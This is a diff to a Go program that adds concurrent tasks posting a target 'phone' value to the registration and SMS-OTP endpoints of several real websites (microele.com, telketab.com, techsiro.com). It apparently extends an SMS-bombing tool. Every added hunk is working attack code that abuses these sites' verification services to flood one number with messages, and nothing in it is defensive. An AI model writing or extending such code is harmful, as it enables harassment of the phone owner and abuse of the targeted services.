@@ -341,7 +341,42 @@ func main() {
 
 
 
+// microele.com (Registration - POST Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("id_customer", "") 
+			formData.Set("back", ",my-account") 
+			formData.Set("firstname", "123") 
+			formData.Set("lastname", "123") 
+			formData.Set("password", "123456") 
+			formData.Set("action", "register") 
+			formData.Set("username", phone) 
+			formData.Set("ajax", "1") 
+			sendFormRequest(ctx, "https://www.microele.com/login?back=my-account", formData, &wg, ch)
+		}
 
+		// telketab.com (POST Form) 
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("identity", phone)
+			formData.Set("secret", "") 
+			formData.Set("plugin", "otp_field_sms_processor") 
+			formData.Set("key", "otp_field_user_auth_form__otp_sms")
+			sendFormRequest(ctx, "https://telketab.com/opt_field/check_secret", formData, &wg, ch)
+		}
+
+		// techsiro.com (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("client", "web")
+			formData.Set("method", "POST") 
+			formData.Set("_token", "") 
+			formData.Set("mobile", phone) 
+			sendFormRequest(ctx, "https://techsiro.com/send-otp", formData, &wg, ch)
+		}
 		// shimashoes.com (Registration - POST Form)
 		wg.Add(1)
 		tasks <- func() {
